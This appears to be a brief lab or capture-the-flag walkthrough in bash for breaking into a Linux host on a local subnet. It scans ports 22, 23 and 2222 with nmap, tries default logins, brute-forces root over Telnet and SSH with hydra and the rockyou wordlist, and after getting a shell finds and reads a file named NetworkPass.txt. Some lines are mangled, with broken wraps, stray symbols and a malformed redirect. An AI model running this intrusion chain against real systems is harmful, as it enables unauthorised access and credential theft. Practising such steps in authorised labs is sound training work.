```bash
# Step 1 : 
nmap -sV -p22,23,2222 192.168.0.0/24
* `22` - SSH
* `23` - Telnet
* `2222` - Sometimes custom SSH
#Youʼll see which host is running a remote login + command execut
ion service.--
=
# Step 2: Check for weak credentials
* For Telnet:
telnet <target-ip>
#Try common logins (`root:root`, `admin:admin`, `user:password`, et
c.).
#Or brute-force with Hydra:
hydra -l root -P /usr/share/wordlists/rockyou.txt telnet://<target-ip>
* For SSH
ssh <user>@<target-ip>
If brute force is allowed:
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<target-ip>--

# Step 3: Gain shell access
Once you log in successfully, youʼll be inside the Linux target.
```

 Step 4 Locate the sensitive file
Search for `NetworkPass.txt`:
find / -type f -name "NetworkPass.txt" 2/dev/null--
 Step 5 Read the content
cat /path/to/NetworkPass.txt
```
